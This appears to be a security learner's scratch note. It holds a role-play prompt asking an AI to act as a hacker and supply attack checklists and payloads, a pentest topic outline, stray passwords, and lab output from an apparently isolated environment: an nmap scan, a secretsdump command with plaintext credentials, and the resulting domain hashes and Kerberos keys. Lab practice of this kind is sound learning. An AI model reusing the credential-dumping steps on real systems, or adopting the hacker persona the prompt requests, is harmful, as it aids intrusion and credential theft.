---
title: "t3mp"
tags:
  - fetus
---
prompt:
```
Act like an experienced, fast-talking hacker. I want detailed vulnerability and attack checklists in a nested bullet format. Top-level items should be attack vectors or misconfigs, and sub-bullets should explain what to try, what to look for, tools, or example payloads. Keep everything tight, practical, and lab-focused. Skip fluff—just give me high-signal breakdowns like we've done before. Use emoticons like :D, :) and :3 instead of emojis. I want this style for things like protocols (SSH, HTTP, SMB), OS priv esc, post-exploitation, cloud attacks, recon, red teaming, bug bounty, etc. Let’s start with [insert topic here].
```
### **General Pentest Phases**

- **Recon (Active & Passive)**
    
- **Enumeration**
    
- **Initial Access**
    
- **Privilege Escalation**
    
- **Lateral Movement**
    
- **Persistence**
    
- **Exfiltration**
    
- **Post-Exploitation Cleanup / TTP Hiding**
    

---

### **OS-Specific**

- **Windows Local Enumeration**
    
- **Linux Local Enumeration**
    
- **Windows PrivEsc**
    
- **Linux PrivEsc**
    
- **MacOS Attacks**
    
- **Active Directory Abuse**
    
- **Windows Defender Evasion**
    
- **UAC Bypass Methods**
    

---

### **App-Level**

- **Web App Pentesting**
    
    - OWASP Top 10 Checklist
        
    - API Pentesting
        
    - SSRF, SSTI, etc.
        
- **Mobile App Pentesting**
    
    - Android
        
    - iOS
        
- **Thick Client Pentesting**
    
- **Cloud Security**
    
    - AWS / Azure / GCP enum & misconfig exploitation
        

---

### **Common Services / Software Targets**

- **VPN Pentesting**
    
- **Email Infrastructure**
    
- **CI/CD Pipelines (Jenkins, GitLab, etc.)**
    
- **Docker / Kubernetes Attacks**
    
- **Git Repos & Secrets Hunting**
    
- **Firewall / IDS Evasion Tactics**
    
- **WebShell Usage / Detection Bypass**
    
- **Malware Drop & Execution Vectors**
    

---

### **Red Team Ops**

- **C2 Infrastructure Setup (Cobalt Strike, Mythic, etc.)**
    
- **Phishing Toolkit**
    
- **Payload Obfuscation**
    
- **Living Off the Land (LOLBin abuse)**
    
- **OPSEC Best Practices for Red Teaming**
    

---

### **Bug Bounty Specific**

- **Recon Automation (with tools)**
    
- **Subdomain Takeovers**
    
- **Param Hunting**
    
- **Auth Bypass Tricks**
    
- **Bug Bounty PrivEsc via misconfigs**

----
---
---
- programming - python
- CTF 
	- hash cracking 
	- geolocation osint 
	- binary exploitation 
		- tcm - bof made easy 2022 ed 
- Active directory 




- augmidesk 
- next ventures 
- oolio


- HTL - Cybersecurity Services, Solutions and Consultency
https://www.collegesidekick.com/study-docs/28118025
https://waris-damkham.netlify.app/#resume



PASSWOD OF HOTHOST: **Very3stroungPassword**
5K2bYVQaWA5cE25pvL8yY54JCV47vnCCbWLkUeVfE6jgjdMqMfywwyPbQwGxbOLE

Nmap scan report for 10.10.10.100
Host is up (0.15s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE    SERVICE       VERSION
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-06 02:29:00Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: ent.corp0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     tcpwrapped
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: ent.corp0., Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
3389/tcp filtered ms-wbt-server
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: ENT-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

echo -n "DB_P@ssw0rd\!" | base64
REJfUEBzc3cwcmQh

http://10.10.10.20/elfinder/files/AD_Resources.txt

Administrator:500:aad3b435b51404eeaad3b435b51404ee:3d15cb1141d579823f8bb08f1f23e316:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:36405f88da713c31bbff52e57aea1f86:::
ent.corp\sync_user:1103:aad3b435b51404eeaad3b435b51404ee:e58b89915ba50f299b4bb10325894f91:::
ENT-DC$:1000:aad3b435b51404eeaad3b435b51404ee:6eae4234e4c033decf90cc618781bb94:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:992f0f89c2eec235f94d01103043a3626f1a54e5adc45280ebe58d0883dc294e
Administrator:aes128-cts-hmac-sha1-96:c3c88d0395d8c7e93039108279fa3cb9
Administrator:des-cbc-md5:ad9de62585018c5b
krbtgt:aes256-cts-hmac-sha1-96:1b161ecb048ed49498658525fea07d4278aeab4c8d60ee32e6a61392d14ec924
krbtgt:aes128-cts-hmac-sha1-96:61a3167db44973b38e6ea0ddb9f3f07d
krbtgt:des-cbc-md5:37ad9e49e3ea0b52
ent.corp\sync_user:aes256-cts-hmac-sha1-96:73ae7f5121e08ef5224bf82c941db87bf14ce5bf0bc3c0805b95485885db511f
ent.corp\sync_user:aes128-cts-hmac-sha1-96:72f6b128b62adb5cf0347e8655f41afc
ent.corp\sync_user:des-cbc-md5:377615f8b9106445
ENT-DC$:aes256-cts-hmac-sha1-96:4e82a35cd651b6daa676343a62ed00be2ce0ff478f769ab076d5a800f8ea3a4f
ENT-DC$:aes128-cts-hmac-sha1-96:dd06e0df95ace54cdbddd267034bc272
ENT-DC$:des-cbc-md5:9b9e253ba21531e6

secretsdump.py ent.corp/sync_user:Summer@2025@10.10.10.100

C:\Users\Administrator\Desktop

189500